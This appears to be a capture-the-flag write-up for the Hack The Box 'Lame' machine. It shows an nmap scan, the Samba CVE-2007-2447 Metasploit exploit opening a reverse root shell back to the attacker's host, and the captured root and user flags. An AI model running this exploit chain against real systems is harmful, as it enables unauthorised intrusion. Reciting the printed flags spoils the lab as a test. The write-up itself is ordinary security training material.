# Lame

### Nmap scan
```
$ nmap -Pn -sC -sV -oA nmap/lame 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 06:47 EDT
Nmap scan report for 10.10.10.3
Host is up (0.046s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m04s, deviation: 2h49m43s, median: 3s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-07-13T06:47:28-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.43 seconds
```

### Open Ports
 - 21 (FTP)
 - 22 (SSH)
 - 139 (Samba)
 - 445 (Samba smbd 3.0.20-Debian)

 Exploits for Samba smbd 3.0.20: [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)

### Technique 1: Metasploit
```
msf5 > search CVE-2007-2447

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


msf5 > use 0
msf5 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.7:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo omvTrya5zB7DRznt;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\nomvTrya5zB7DRznt\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.7:4444 -> 10.10.10.3:38615) at 2020-07-13 07:33:54 -0400
```

We now have a shell where we are root
```
whoami
root


shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell

sh-3.2# ls
ls
bin    dev   initrd      lost+found  nohup.out  root  sys  var
boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz
cdrom  home  lib         mnt         proc       srv   usr
sh-3.2# cd root
cd root
sh-3.2# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
sh-3.2# cat root.txt
cat root.txt
92caac3be140ef409e45721348a4e9df
sh-3.2# 
```
Since we are root, we can just traverse to the user directory and cat the user flag as well:
```
sh-3.2# cd home
cd home
sh-3.2# ls
ls
ftp  makis  service  user
sh-3.2# cd makis
cd makis
sh-3.2# ls
ls
user.txt
sh-3.2# cat user.txt
cat user.txt
69454a937d94f5f0225ea00acd2e84c5
sh-3.2# 
```



